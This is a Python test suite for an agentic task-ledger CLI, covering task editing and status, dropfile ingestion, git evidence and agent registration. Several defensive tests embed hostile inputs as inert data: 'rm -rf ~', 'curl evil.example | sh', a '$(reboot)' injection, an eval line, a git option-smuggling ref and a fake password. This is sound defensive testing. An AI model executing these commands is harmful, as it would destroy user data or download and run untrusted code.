"""Complete-today build tests (P1+): task lifecycle completion — assign,
edit, status transitions, list filters — proven on the Night-1-shaped
back-compat fixture per the contract's TESTS rule.

Fixture reminder: project `demo`; T-0001 done (kind code, note evidence);
T-0002 ready in demo; T-0003 projectless inbox capture; mirror synced.
"""

from __future__ import annotations

import json
import shutil
import sqlite3
import subprocess
import unittest
from pathlib import Path
from unittest import mock

from weekend_harness import Night1BackCompatCase, WeekendOpsTestCase

from agentic_os import db, events, ingest, ops


class TestTaskAssign(Night1BackCompatCase):
    def raw(self, sql: str, params=()) -> None:
        conn = sqlite3.connect(self.db_path)
        try:
            with conn:
                conn.execute(sql, params)
        finally:
            conn.close()

    def task_events(self, action: str) -> list[dict]:
        entries = json.loads(self.aos("log", "--json"))["events"]
        return [
            e for e in entries
            if e["entity"] == "task" and e["action"] == action
        ]

    def test_assign_projectless_inbox_task_keeps_status(self):
        out = self.aos("task", "assign", "T-0003", "-p", "demo")
        self.assertIn("T-0003 assigned to project demo", out)
        detail = json.loads(self.aos("task", "show", "T-0003", "--json"))
        self.assertEqual(detail["task"]["project"], "demo")
        self.assertEqual(detail["task"]["status"], "inbox")  # unchanged
        payload = self.task_events("assign")[0]["payload"]
        self.assertEqual(payload["task"], "T-0003")
        self.assertEqual(payload["project"], "demo")
        self.assertIsNone(payload["from_project"])
        self.assert_no_schema_drift()

    def test_assign_projectless_in_progress_task_keeps_status(self):
        # `run start` on a capture creates the projectless in_progress state.
        self.aos("run", "start", "T-0003", "--agent", "claude-code")
        self.aos("task", "assign", "T-0003", "-p", "demo")
        detail = json.loads(self.aos("task", "show", "T-0003", "--json"))
        self.assertEqual(detail["task"]["project"], "demo")
        self.assertEqual(detail["task"]["status"], "in_progress")

    def test_assign_moves_non_done_task_between_projects(self):
        self.aos(
            "project", "add", "other", "--name", "Other", "--repo", str(self.repo)
        )
        self.aos("task", "assign", "T-0002", "-p", "other")
        detail = json.loads(self.aos("task", "show", "T-0002", "--json"))
        self.assertEqual(detail["task"]["project"], "other")
        payload = self.task_events("assign")[0]["payload"]
        self.assertEqual(payload["from_project"], "demo")
        self.assertEqual(payload["project"], "other")
        self.assert_no_schema_drift()

    def test_assign_done_task_refuses(self):
        code, out, err = self.aos_fails("task", "assign", "T-0001", "-p", "demo")
        self.assertIn("T-0001", err)
        self.assertIn("done", err)
        detail = json.loads(self.aos("task", "show", "T-0001", "--json"))
        self.assertEqual(detail["task"]["project"], "demo")  # untouched

    def test_assign_unknown_project_refuses(self):
        code, out, err = self.aos_fails("task", "assign", "T-0003", "-p", "ghost")
        self.assertIn("No project 'ghost'", err)
        detail = json.loads(self.aos("task", "show", "T-0003", "--json"))
        self.assertIsNone(detail["task"]["project"])

    def test_assign_same_project_is_eventless_noop(self):
        before = len(json.loads(self.aos("log", "--json"))["events"])
        out = self.aos("task", "assign", "T-0002", "-p", "demo")
        self.assertIn("nothing changed", out)
        after = len(json.loads(self.aos("log", "--json"))["events"])
        self.assertEqual(before, after)

    def test_assign_malformed_id_refuses(self):
        code, out, err = self.aos_fails("task", "assign", "X-1", "-p", "demo")
        self.assertIn("Expected format: T-0001", err)

    def test_assign_refreshes_updated_at(self):
        self.raw(
            "UPDATE tasks SET updated_at = '2000-01-01T00:00:00Z' WHERE id = 3"
        )
        self.aos("task", "assign", "T-0003", "-p", "demo")
        detail = json.loads(self.aos("task", "show", "T-0003", "--json"))
        self.assertNotEqual(detail["task"]["updated_at"], "2000-01-01T00:00:00Z")


class TestTaskEdit(Night1BackCompatCase):
    def test_edit_every_field_and_names_only_payload(self):
        out = self.aos(
            "task", "edit", "T-0002",
            "--title", "Edited title",
            "--kind", "research",
            "--priority", "4",
            "--accept", "edited acceptance",
            "--spec", "edited spec body",
        )
        self.assertIn(
            "T-0002 edited: title, kind, priority, accept, spec", out
        )
        detail = json.loads(self.aos("task", "show", "T-0002", "--json"))
        self.assertEqual(detail["task"]["title"], "Edited title")
        self.assertEqual(detail["task"]["kind"], "research")
        self.assertEqual(detail["task"]["priority"], 4)
        self.assertEqual(detail["task"]["acceptance_md"], "edited acceptance")
        self.assertEqual(detail["task"]["spec_md"], "edited spec body")
        entries = json.loads(self.aos("log", "--json"))["events"]
        edit_events = [
            e for e in entries
            if e["entity"] == "task" and e["action"] == "edit"
        ]
        self.assertEqual(len(edit_events), 1)
        payload = edit_events[0]["payload"]
        self.assertEqual(
            payload,
            {
                "schema_version": 1,
                "task": "T-0002",
                "changed": ["title", "kind", "priority", "accept", "spec"],
            },
        )
        # Field NAMES only — no edited value leaks into the journal.
        self.assertNotIn("Edited title", json.dumps(payload))
        self.assert_no_schema_drift()

    def test_edit_spec_flows_into_pack_goal(self):
        self.aos("task", "edit", "T-0002", "--spec", "spec-body-marker")
        pack_out = self.aos("pack", "build", "T-0002")
        from pathlib import Path

        text = Path(pack_out.strip()).read_text("utf-8")
        goal = text.split("## GOAL")[1].split("## ACCEPTANCE")[0]
        self.assertIn("spec-body-marker", goal)

    def test_edit_title_ripples_to_task_note(self):
        self.aos("task", "edit", "T-0002", "--title", "Ripple title")
        self.aos("sync")
        note = (
            self.aos_dir / "obsidian-vault" / "AOS" / "Tasks" / "T-0002.md"
        ).read_text("utf-8")
        self.assertIn("Ripple title", note)

    def test_task_add_spec_flag(self):
        self.aos(
            "task", "add", "Spec at birth", "-p", "demo",
            "--spec", "born with spec",
        )
        detail = json.loads(self.aos("task", "show", "T-0004", "--json"))
        self.assertEqual(detail["task"]["spec_md"], "born with spec")
        self.assert_no_schema_drift()

    def test_edit_done_task_refuses_no_exceptions(self):
        for argv in (
            ["--title", "sneaky"],
            ["--priority", "1"],
            ["--spec", "sneaky spec"],
        ):
            with self.subTest(argv=argv):
                code, out, err = self.aos_fails("task", "edit", "T-0001", *argv)
                self.assertIn("T-0001", err)
                self.assertIn("frozen", err)

    def test_edit_requires_at_least_one_field(self):
        code, out, err = self.aos_fails("task", "edit", "T-0002")
        self.assertIn("Nothing to edit", err)

    def test_edit_validates_kind_and_priority(self):
        code, out, err = self.aos_fails(
            "task", "edit", "T-0002", "--kind", "vibe"
        )
        self.assertIn("code|research|writing|ops", err)
        for bad in ("0", "6", "-1"):
            with self.subTest(priority=bad):
                code, out, err = self.aos_fails(
                    "task", "edit", "T-0002", "--priority", bad
                )
                self.assertIn("between 1 and 5", err)

    def test_edit_rejects_empty_values(self):
        code, out, err = self.aos_fails(
            "task", "edit", "T-0002", "--title", "   "
        )
        self.assertIn("must not be empty", err)
        code, out, err = self.aos_fails(
            "task", "edit", "T-0002", "--accept", "   "
        )
        self.assertIn("must not be empty", err)

    def test_edit_malformed_id_refuses(self):
        code, out, err = self.aos_fails("task", "edit", "nope", "--title", "x")
        self.assertIn("Expected format: T-0001", err)


class TestTaskStatus(Night1BackCompatCase):
    def test_legal_transitions_roundtrip_with_events(self):
        self.aos("task", "assign", "T-0003", "-p", "demo")
        out = self.aos("task", "status", "T-0003", "ready")
        self.assertIn("T-0003 status: inbox → ready", out)
        self.aos("task", "status", "T-0003", "in_progress")
        out = self.aos("task", "status", "T-0003", "ready")
        self.assertIn("in_progress → ready", out)
        entries = json.loads(self.aos("log", "--json"))["events"]
        moves = [
            (e["payload"]["from"], e["payload"]["to"])
            for e in entries
            if e["entity"] == "task" and e["action"] == "status"
        ]
        self.assertEqual(
            moves,
            [
                ("inbox", "ready"),
                ("ready", "in_progress"),
                ("in_progress", "ready"),
            ],
        )
        self.assert_no_schema_drift()

    def test_illegal_transitions_name_the_legal_set(self):
        self.aos("task", "assign", "T-0003", "-p", "demo")
        for task_hid, target in (
            ("T-0003", "in_progress"),  # inbox → in_progress
            ("T-0003", "inbox"),        # inbox → inbox
            ("T-0002", "ready"),        # ready → ready
            ("T-0002", "inbox"),        # ready → inbox
        ):
            with self.subTest(task=task_hid, target=target):
                code, out, err = self.aos_fails(
                    "task", "status", task_hid, target
                )
                self.assertIn("Illegal transition", err)
                self.assertIn("inbox→ready", err)
                self.assertIn("ready→in_progress", err)
                self.assertIn("in_progress→ready", err)

    def test_done_target_points_at_the_done_command(self):
        code, out, err = self.aos_fails("task", "status", "T-0002", "done")
        self.assertIn("python aos.py done T-0002", err)
        detail = json.loads(self.aos("task", "show", "T-0002", "--json"))
        self.assertEqual(detail["task"]["status"], "ready")

    def test_done_task_status_is_frozen(self):
        code, out, err = self.aos_fails("task", "status", "T-0001", "ready")
        self.assertIn("T-0001 is done", err)

    def test_projectless_task_cannot_leave_inbox(self):
        code, out, err = self.aos_fails("task", "status", "T-0003", "ready")
        self.assertIn("assign a project first", err)
        self.assertIn("task assign T-0003", err)
        detail = json.loads(self.aos("task", "show", "T-0003", "--json"))
        self.assertEqual(detail["task"]["status"], "inbox")

    def test_unknown_status_names_the_vocabulary(self):
        code, out, err = self.aos_fails("task", "status", "T-0002", "blocked")
        self.assertIn("inbox|ready|in_progress|done", err)


class TestTaskListFilters(Night1BackCompatCase):
    def test_kind_filter(self):
        self.aos("task", "edit", "T-0002", "--kind", "research")
        doc = json.loads(self.aos("task", "list", "--kind", "research", "--json"))
        self.assertEqual([t["id"] for t in doc["tasks"]], ["T-0002"])
        doc = json.loads(self.aos("task", "list", "--kind", "code", "--json"))
        self.assertEqual([t["id"] for t in doc["tasks"]], ["T-0001", "T-0003"])
        code, out, err = self.aos_fails("task", "list", "--kind", "vibe")
        self.assertIn("code|research|writing|ops", err)

    def test_missing_evidence_filter_composes(self):
        doc = json.loads(self.aos("task", "list", "--missing-evidence", "--json"))
        self.assertEqual([t["id"] for t in doc["tasks"]], ["T-0002", "T-0003"])
        doc = json.loads(
            self.aos(
                "task", "list", "--missing-evidence", "--status", "ready",
                "--json",
            )
        )
        self.assertEqual([t["id"] for t in doc["tasks"]], ["T-0002"])

    def test_text_output_line_format_is_stable(self):
        out = self.aos("task", "list")
        lines = out.splitlines()
        expected = (
            "T-0002   ready        code      p2   demo             Second task"
        )
        self.assertIn(expected, lines)


DROPFILE_OK = """\
# AOS DROPFILE
task: T-0002
agent: codex
outcome: partial
summary: implemented half the thing

## evidence
- kind: note | ref: dropfile-proof | claim: it half works
- kind: command_output | ref: pytest -q | claim: 12 passed

## open questions
- does the auth flow need retries?
"""


class DropfileCase(Night1BackCompatCase):
    def write_dropfile(self, content: str = DROPFILE_OK, name: str = "drop.md"):
        path = self.root / name
        path.write_text(content, encoding="utf-8")
        return path

    def row_counts(self) -> dict[str, int]:
        conn = sqlite3.connect(self.db_path)
        try:
            return {
                table: conn.execute(
                    f"SELECT COUNT(*) AS n FROM {table}"
                ).fetchone()[0]
                for table in ("evidence", "runs", "handoffs", "events")
            }
        finally:
            conn.close()


class TestDropfileIngest(DropfileCase):
    def test_golden_happy_path_ends_the_single_open_run(self):
        self.aos("run", "start", "T-0002", "--agent", "codex")  # R-0002, open
        path = self.write_dropfile()
        out = self.aos("ingest", "dropfile", str(path))
        self.assertIn(
            "Ingested dropfile for T-0002 from codex (outcome: partial)", out
        )
        self.assertIn("evidence: E-0002, E-0003", out)
        self.assertIn("run ended: R-0002 → partial", out)
        self.assertIn("open questions → handoff H-0001 (to generic)", out)
        detail = json.loads(self.aos("task", "show", "T-0002", "--json"))
        added = detail["evidence"]
        self.assertEqual(
            [(e["kind"], e["ref"], e["claim"], e["provenance"]) for e in added],
            [
                ("note", "dropfile-proof", "it half works", "agent:codex"),
                ("command_output", "pytest -q", "12 passed", "agent:codex"),
            ],
        )
        run = detail["runs"][0]
        self.assertEqual(run["outcome"], "partial")
        self.assertEqual(run["summary_md"], "implemented half the thing")
        self.assertIsNotNone(run["ended_at"])
        handoff = detail["handoffs"][0]
        self.assertEqual(handoff["from_agent"], "codex")
        self.assertEqual(handoff["to_agent"], "generic")
        entries = json.loads(self.aos("log", "--json"))["events"]
        ingest_events = [
            e for e in entries
            if e["entity"] == "system" and e["action"] == "dropfile_ingest"
        ]
        self.assertEqual(len(ingest_events), 1)
        payload = ingest_events[0]["payload"]
        self.assertEqual(payload["task"], "T-0002")
        self.assertEqual(payload["agent"], "codex")
        self.assertEqual(payload["evidence"], ["E-0002", "E-0003"])
        self.assertEqual(payload["run_ended"], "R-0002")
        self.assertEqual(payload["open_runs"], 1)
        self.assertEqual(payload["handoff"], "H-0001")
        self.assertEqual(len(payload["sha256"]), 64)
        self.assertEqual(ingest_events[0]["actor"], "agent:codex")
        self.aos("sync")
        self.aos("doctor")
        self.assert_no_schema_drift()

    def test_duplicate_hash_refused_even_at_another_path(self):
        path = self.write_dropfile()
        self.aos("ingest", "dropfile", str(path))
        before = self.row_counts()
        code, out, err = self.aos_fails("ingest", "dropfile", str(path))
        self.assertIn("Duplicate dropfile", err)
        self.assertIn("sha256", err)
        copy = self.write_dropfile(name="copy-of-drop.md")
        code, out, err = self.aos_fails("ingest", "dropfile", str(copy))
        self.assertIn("Duplicate dropfile", err)
        self.assertEqual(self.row_counts(), before)

    def test_malformed_dropfiles_refuse_naming_the_line(self):
        cases = [
            ("# DROPFILE\ntask: T-0002\n", "line 1", "# AOS DROPFILE"),
            (
                "# AOS DROPFILE\nagent: codex\ntask: T-0002\n",
                "line 2",
                "expected 'task: <value>'",
            ),
            (
                "# AOS DROPFILE\ntask: T-0002\nagent: codex\n"
                "outcome: perfect\nsummary: s\n",
                "line 4",
                "outcome must be one of",
            ),
            (
                "# AOS DROPFILE\ntask: T-0002\nagent: codex\n"
                "outcome: success\nsummary: s\n\n## evidence\n"
                "- kind: screenshot | ref: r | claim: c\n\n## open questions\n",
                "line 8",
                "evidence kind must be one of",
            ),
            (
                "# AOS DROPFILE\ntask: T-0002\nagent: codex\n"
                "outcome: success\nsummary: s\n\n## evidence\n"
                "- kind: note ref: r claim: c\n\n## open questions\n",
                "line 8",
                "expected '- kind: K | ref: R | claim: C'",
            ),
            (
                "# AOS DROPFILE\ntask: T-0002\nagent: codex\n"
                "outcome: success\nsummary: s\n\n## evidence\n"
                "- kind: note | ref: r | claim: c\n",
                "",
                "missing '## open questions'",
            ),
            (
                "# AOS DROPFILE\ntask: T-0002\nagent: codex\n"
                "outcome: success\nsummary: s\n\n## evidence\n\n"
                "## open questions\nstray prose line\n",
                "line 10",
                "expected '- <open question>'",
            ),
            (
                "# AOS DROPFILE\ntask: T-0002\nagent: evil name\n"
                "outcome: success\nsummary: s\n\n## evidence\n\n"
                "## open questions\n",
                "line 3",
                "agent name must match",
            ),
            (
                "# AOS DROPFILE\ntask: task-two\nagent: codex\n"
                "outcome: success\nsummary: s\n\n## evidence\n\n"
                "## open questions\n",
                "line 2",
                "task must look like T-0001",
            ),
        ]
        before = self.row_counts()
        for content, line_marker, reason in cases:
            with self.subTest(reason=reason):
                path = self.write_dropfile(content, name="bad.md")
                code, out, err = self.aos_fails(
                    "ingest", "dropfile", str(path)
                )
                self.assertIn("Malformed dropfile", err)
                if line_marker:
                    self.assertIn(line_marker, err)
                self.assertIn(reason, err)
        self.assertEqual(self.row_counts(), before)  # nothing ever ingested

    def test_unknown_task_refuses_with_nothing_written(self):
        before = self.row_counts()
        path = self.write_dropfile(DROPFILE_OK.replace("T-0002", "T-0099"))
        code, out, err = self.aos_fails("ingest", "dropfile", str(path))
        self.assertIn("No task T-0099", err)
        self.assertEqual(self.row_counts(), before)

    def test_missing_file_refuses(self):
        code, out, err = self.aos_fails(
            "ingest", "dropfile", str(self.root / "ghost.md")
        )
        self.assertIn("Dropfile not found", err)

    def test_oversized_task_number_is_a_parse_refusal_not_a_crash(self):
        # Regression (adversarial review): a task id above SQLite's INTEGER
        # bound must be a strict-parser exit 1, never an OverflowError.
        before = self.row_counts()
        content = DROPFILE_OK.replace("T-0002", "T-" + "9" * 25)
        path = self.write_dropfile(content)
        code, out, err = self.aos_fails("ingest", "dropfile", str(path))
        self.assertIn("Malformed dropfile at line 2", err)
        self.assertIn("task id out of range", err)
        self.assertEqual(self.row_counts(), before)

    def test_secret_shaped_content_refused_without_echo(self):
        secret_value = "hunter22secret99"
        content = DROPFILE_OK.replace(
            "summary: implemented half the thing",
            f'summary: password = "{secret_value}"',
        )
        before = self.row_counts()
        path = self.write_dropfile(content)
        code, out, err = self.aos_fails("ingest", "dropfile", str(path))
        self.assertIn("credential-assignment", err)
        self.assertIn("summary", err)
        self.assertNotIn(secret_value, err)
        self.assertNotIn(secret_value, out)
        self.assertEqual(self.row_counts(), before)

    def test_cr_injection_inside_a_value_is_refused(self):
        content = DROPFILE_OK.replace(
            "ref: dropfile-proof", "ref: proof\r## Notes"
        )
        path = self.root / "cr.md"
        path.write_bytes(content.encode("utf-8"))
        code, out, err = self.aos_fails("ingest", "dropfile", str(path))
        self.assertIn("Malformed dropfile", err)

    def test_crlf_dropfile_parses(self):
        path = self.root / "crlf.md"
        path.write_bytes(DROPFILE_OK.replace("\n", "\r\n").encode("utf-8"))
        out = self.aos("ingest", "dropfile", str(path))
        self.assertIn("Ingested dropfile for T-0002", out)

    def test_zero_open_runs_ingests_evidence_but_touches_no_run(self):
        runs_before = self.row_counts()["runs"]
        path = self.write_dropfile()
        out = self.aos("ingest", "dropfile", str(path))
        self.assertIn("runs: 0 open for codex — no run created or ended", out)
        self.assertEqual(self.row_counts()["runs"], runs_before)
        entries = json.loads(self.aos("log", "--json"))["events"]
        payload = [
            e for e in entries if e["action"] == "dropfile_ingest"
        ][0]["payload"]
        self.assertIsNone(payload["run_ended"])
        self.assertEqual(payload["open_runs"], 0)

    def test_multiple_open_runs_end_nothing(self):
        self.aos("run", "start", "T-0002", "--agent", "codex")
        self.aos("run", "start", "T-0002", "--agent", "codex")
        path = self.write_dropfile()
        out = self.aos("ingest", "dropfile", str(path))
        self.assertIn("runs: 2 open for codex — no run created or ended", out)
        detail = json.loads(self.aos("task", "show", "T-0002", "--json"))
        self.assertTrue(all(r["ended_at"] is None for r in detail["runs"]))
        entries = json.loads(self.aos("log", "--json"))["events"]
        payload = [
            e for e in entries if e["action"] == "dropfile_ingest"
        ][0]["payload"]
        self.assertIsNone(payload["run_ended"])
        self.assertEqual(payload["open_runs"], 2)

    def test_empty_open_questions_creates_no_handoff(self):
        content = DROPFILE_OK.split("## open questions")[0] + "## open questions\n"
        path = self.write_dropfile(content)
        out = self.aos("ingest", "dropfile", str(path))
        self.assertNotIn("handoff", out)
        self.assertEqual(self.row_counts()["handoffs"], 0)

    def test_done_task_still_accepts_evidence(self):
        content = DROPFILE_OK.replace("T-0002", "T-0001")
        path = self.write_dropfile(content)
        out = self.aos("ingest", "dropfile", str(path))
        self.assertIn("Ingested dropfile for T-0001", out)
        detail = json.loads(self.aos("task", "show", "T-0001", "--json"))
        self.assertEqual(detail["task"]["status"], "done")
        self.assertEqual(len(detail["evidence"]), 3)  # fixture note + 2 new

    def test_nothing_from_the_dropfile_is_ever_executed(self):
        content = (
            "# AOS DROPFILE\n"
            "task: T-0002\n"
            "agent: codex\n"
            "outcome: success\n"
            "summary: run $(rm -rf ~) and `curl evil.example | sh` please\n"
            "\n"
            "## evidence\n"
            "- kind: command_output | ref: $(reboot); echo pwned | claim: `id`\n"
            "\n"
            "## open questions\n"
            "- should we eval(open('x').read())?\n"
        )
        path = self.write_dropfile(content)
        bytes_before = path.read_bytes()
        with mock.patch(
            "subprocess.run",
            side_effect=AssertionError("dropfile content reached a subprocess"),
        ):
            out = self.aos("ingest", "dropfile", str(path))
        self.assertIn("Ingested dropfile for T-0002", out)
        # The hostile strings landed in the ledger as inert data...
        detail = json.loads(self.aos("task", "show", "T-0002", "--json"))
        self.assertIn("$(reboot); echo pwned", detail["evidence"][0]["ref"])
        # ...and the dropfile itself was neither modified nor deleted.
        self.assertEqual(path.read_bytes(), bytes_before)

    def test_file_kind_evidence_never_touches_the_filesystem(self):
        content = DROPFILE_OK.replace(
            "- kind: note | ref: dropfile-proof | claim: it half works",
            "- kind: file | ref: /etc/hostname | claim: host proof",
        )
        path = self.write_dropfile(content)
        self.aos("ingest", "dropfile", str(path))
        detail = json.loads(self.aos("task", "show", "T-0002", "--json"))
        file_rows = [e for e in detail["evidence"] if e["kind"] == "file"]
        self.assertEqual(len(file_rows), 1)
        self.assertIsNone(file_rows[0]["sha256"])  # never opened, never hashed

    def test_ingest_is_all_or_nothing(self):
        self.aos("run", "start", "T-0002", "--agent", "codex")
        path = self.write_dropfile()
        before = self.row_counts()
        real_emit = events.emit

        def failing_emit(conn, **kwargs):
            if kwargs.get("action") == "dropfile_ingest":
                raise RuntimeError("forced failure at the final emit")
            return real_emit(conn, **kwargs)

        conn = db.connect(self.db_path)
        try:
            with mock.patch.object(events, "emit", side_effect=failing_emit):
                with self.assertRaises(RuntimeError):
                    ingest.ingest_dropfile(conn, path)
        finally:
            conn.close()
        self.assertEqual(self.row_counts(), before)  # full rollback
        detail = json.loads(self.aos("task", "show", "T-0002", "--json"))
        self.assertIsNone(detail["runs"][0]["ended_at"])  # run still open


GIT_BIN = shutil.which("git")


@unittest.skipUnless(GIT_BIN, "git executable unavailable")
class TestGitEvidence(Night1BackCompatCase):
    """`evidence git` — success and failure paths against a temp git repo
    (the contract's P3 gate explicitly authorizes git repos in tests,
    superseding D-P4.1 for this command)."""

    def make_git_repo(self) -> tuple[Path, str]:
        repo = self.new_tmp_dir("git repo with spaces")
        def git(*args: str) -> None:
            subprocess.run(
                [GIT_BIN, "-C", str(repo), *args],
                check=True, capture_output=True, text=True, timeout=10,
            )
        git("init", "-q")
        (repo / "file.txt").write_text("hello\n", encoding="utf-8")
        git("add", "file.txt")
        git(
            "-c", "user.email=t@t", "-c", "user.name=T",
            "commit", "-q", "-m", "test commit subject",
        )
        proc = subprocess.run(
            [GIT_BIN, "-C", str(repo), "rev-parse", "HEAD"],
            check=True, capture_output=True, text=True, timeout=10,
        )
        return repo, proc.stdout.strip()

    def evidence_rows(self) -> list[dict]:
        detail = json.loads(self.aos("task", "show", "T-0002", "--json"))
        return detail["evidence"]

    def test_head_resolves_full_sha_subject_and_diffstat(self):
        repo, sha = self.make_git_repo()
        out = self.aos("evidence", "git", "T-0002", "HEAD", "--repo", str(repo))
        self.assertIn(f"commit {sha[:12]}", out)
        self.assertIn("test commit subject", out)
        rows = self.evidence_rows()
        self.assertEqual(len(rows), 1)
        self.assertEqual(rows[0]["kind"], "commit")
        self.assertEqual(rows[0]["ref"], sha)  # FULL hash stored
        self.assertEqual(rows[0]["claim"], "test commit subject")
        entries = json.loads(self.aos("log", "--json"))["events"]
        added = [
            e for e in entries
            if e["entity"] == "evidence" and e["action"] == "add"
            and e["payload"].get("via") == "git"
        ]
        self.assertEqual(len(added), 1)
        payload = added[0]["payload"]
        self.assertEqual(payload["ref"], sha)
        self.assertEqual(payload["repo"], str(repo))
        self.assertEqual(payload["subject"], "test commit subject")
        self.assertIn("1 file changed", payload["diffstat"])
        self.assert_no_schema_drift()

    def test_short_sha_resolves_to_full(self):
        repo, sha = self.make_git_repo()
        self.aos("evidence", "git", "T-0002", sha[:7], "--repo", str(repo))
        self.assertEqual(self.evidence_rows()[0]["ref"], sha)

    def test_claim_flag_overrides_subject(self):
        repo, sha = self.make_git_repo()
        self.aos(
            "evidence", "git", "T-0002", "HEAD", "--repo", str(repo),
            "--claim", "my own claim",
        )
        self.assertEqual(self.evidence_rows()[0]["claim"], "my own claim")

    def test_project_repo_is_the_default(self):
        repo, sha = self.make_git_repo()
        self.aos(
            "project", "add", "gitproj", "--name", "Git", "--repo", str(repo)
        )
        self.aos("task", "add", "Git task", "-p", "gitproj")
        self.aos("evidence", "git", "T-0004", "HEAD")
        detail = json.loads(self.aos("task", "show", "T-0004", "--json"))
        self.assertEqual(detail["evidence"][0]["ref"], sha)

    def test_unknown_commit_refuses_with_no_row(self):
        repo, sha = self.make_git_repo()
        code, out, err = self.aos_fails(
            "evidence", "git", "T-0002", "deadbeef" * 5, "--repo", str(repo)
        )
        self.assertIn("Unknown commit", err)
        self.assertEqual(self.evidence_rows(), [])

    def test_outside_a_git_repo_refuses(self):
        code, out, err = self.aos_fails(
            "evidence", "git", "T-0002", "HEAD", "--repo", str(self.repo)
        )
        self.assertIn("Not a git repository", err)
        self.assertEqual(self.evidence_rows(), [])

    def test_projectless_task_requires_repo_flag(self):
        code, out, err = self.aos_fails("evidence", "git", "T-0003", "HEAD")
        self.assertIn("--repo", err)

    def test_dash_prefixed_ref_refused_before_git_runs(self):
        # A '-'-leading ref could smuggle a git option; the guard sits below
        # argparse, so prove it at the ops layer.
        from agentic_os.utils import AosError

        repo, sha = self.make_git_repo()
        conn = db.connect(self.db_path)
        try:
            with self.assertRaises(AosError) as ctx:
                ops.add_git_evidence(
                    conn, task_id=2, commit="--output=evil", repo=str(repo)
                )
        finally:
            conn.close()
        self.assertIn("Invalid commit ref", str(ctx.exception))

    def test_missing_git_binary_refuses_gracefully(self):
        repo, sha = self.make_git_repo()
        with mock.patch.object(ops.shutil, "which", return_value=None):
            code, out, err = self.aos_fails(
                "evidence", "git", "T-0002", "HEAD", "--repo", str(repo)
            )
        self.assertIn("git executable not found", err)

    def test_non_utf8_git_output_degrades_instead_of_crashing(self):
        # Regression (adversarial review): git re-encodes subjects per
        # i18n.logOutputEncoding, so `show` output can be non-UTF-8; the
        # ingest must still succeed (subject degrades via replacement),
        # never exit 2.
        repo, sha = self.make_git_repo()
        subprocess.run(
            [GIT_BIN, "-C", str(repo), "config",
             "i18n.logOutputEncoding", "latin1"],
            check=True, capture_output=True, timeout=10,
        )
        subprocess.run(
            [GIT_BIN, "-C", str(repo),
             "-c", "user.email=t@t", "-c", "user.name=T",
             "commit", "-q", "--allow-empty", "-m", "café résumé subject"],
            check=True, capture_output=True, timeout=10,
        )
        out = self.aos("evidence", "git", "T-0002", "HEAD", "--repo", str(repo))
        self.assertIn("E-0002", out)  # E-0001 is the fixture's note evidence
        rows = self.evidence_rows()
        self.assertEqual(rows[0]["kind"], "commit")
        self.assertEqual(len(rows[0]["ref"]), 40)  # resolved despite subject

    def test_git_timeout_degrades_to_exit_1(self):
        repo, sha = self.make_git_repo()
        with mock.patch.object(
            ops.subprocess, "run",
            side_effect=subprocess.TimeoutExpired(cmd="git", timeout=5),
        ):
            code, out, err = self.aos_fails(
                "evidence", "git", "T-0002", "HEAD", "--repo", str(repo)
            )
        self.assertIn("git unavailable (TimeoutExpired)", err)
        self.assertEqual(self.evidence_rows(), [])

    def test_row_and_event_share_one_transaction(self):
        repo, sha = self.make_git_repo()
        conn = db.connect(self.db_path)
        try:
            before = conn.execute(
                "SELECT COUNT(*) AS n FROM evidence"
            ).fetchone()["n"]
            with mock.patch.object(
                events, "emit", side_effect=RuntimeError("forced failure")
            ):
                with self.assertRaises(RuntimeError):
                    ops.add_git_evidence(
                        conn, task_id=2, commit="HEAD", repo=str(repo)
                    )
            after = conn.execute(
                "SELECT COUNT(*) AS n FROM evidence"
            ).fetchone()["n"]
        finally:
            conn.close()
        self.assertEqual(before, after)


class TestAgentRegistry(Night1BackCompatCase):
    def add_codex(self) -> str:
        return self.aos(
            "agent", "add", "codex", "--kind", "cloud",
            "--notes", "cloud codex agent",
            "--capability", "code", "--capability", "review",
        )

    def test_add_show_list_roundtrip(self):
        out = self.add_codex()
        self.assertIn("Added agent codex (cloud)", out)
        self.aos("agent", "add", "aider", "--kind", "local")
        doc = json.loads(self.aos("agent", "show", "codex", "--json"))
        self.assertEqual(
            doc,
            {
                "agent": {
                    "name": "codex",
                    "kind": "cloud",
                    "capabilities": ["code", "review"],
                    "notes": "cloud codex agent",
                    "invoke_hint": None,
                    "trust_level": 0,
                }
            },
        )
        listing = json.loads(self.aos("agent", "list", "--json"))
        self.assertEqual(set(listing.keys()), {"agents"})
        self.assertEqual(
            [a["name"] for a in listing["agents"]], ["aider", "codex"]
        )
        self.assertEqual(listing["agents"][0]["kind"], "local")
        self.assertEqual(listing["agents"][0]["capabilities"], [])
        text = self.aos("agent", "list")
        self.assertIn("codex", text)
        self.assertIn("code,review", text)
        self.assert_no_schema_drift()

    def test_add_default_kind_is_generic(self):
        self.aos("agent", "add", "plain")
        doc = json.loads(self.aos("agent", "show", "plain", "--json"))
        self.assertEqual(doc["agent"]["kind"], "generic")

    def test_duplicate_add_names_update(self):
        self.add_codex()
        code, out, err = self.aos_fails("agent", "add", "codex")
        self.assertIn("already exists", err)
        self.assertIn("agent update codex", err)

    def test_add_validates_kind_and_name(self):
        code, out, err = self.aos_fails(
            "agent", "add", "codex", "--kind", "robot"
        )
        self.assertIn("local|cloud|human|generic", err)
        for bad in ("evil name", ".hidden", "a/b", "codex\n"):
            # "codex\n" is the adversarial-review regression: '$' matches
            # before a trailing newline, \Z must not.
            with self.subTest(name=bad):
                code, out, err = self.aos_fails("agent", "add", bad)
                self.assertIn("Invalid agent name", err)
        # A '-'-leading name never reaches ops via argparse; prove the guard
        # holds below the parser too.
        from agentic_os.utils import AosError

        conn = db.connect(self.db_path)
        try:
            with self.assertRaises(AosError):
                ops.add_agent(conn, name="-lead")
        finally:
            conn.close()

    def test_no_trust_level_surface_exists(self):
        code, out, err = self.run_cli(
            "--root", str(self.root),
            "agent", "add", "codex", "--trust-level", "3",
        )
        self.assertEqual(code, 1)  # rejected: autonomy is earned, never set

    def test_update_replaces_capabilities_and_notes(self):
        self.add_codex()
        out = self.aos(
            "agent", "update", "codex",
            "--notes", "updated notes", "--capability", "docs",
        )
        self.assertIn("codex updated: notes, capabilities", out)
        doc = json.loads(self.aos("agent", "show", "codex", "--json"))
        self.assertEqual(doc["agent"]["capabilities"], ["docs"])
        self.assertEqual(doc["agent"]["notes"], "updated notes")
        entries = json.loads(self.aos("log", "--json"))["events"]
        agent_events = [
            (e["action"], e["payload"]) for e in entries
            if e["entity"] == "agent"
        ]
        self.assertEqual(len(agent_events), 2)
        self.assertEqual(agent_events[0][0], "add")
        self.assertEqual(agent_events[0][1]["agent"], "codex")
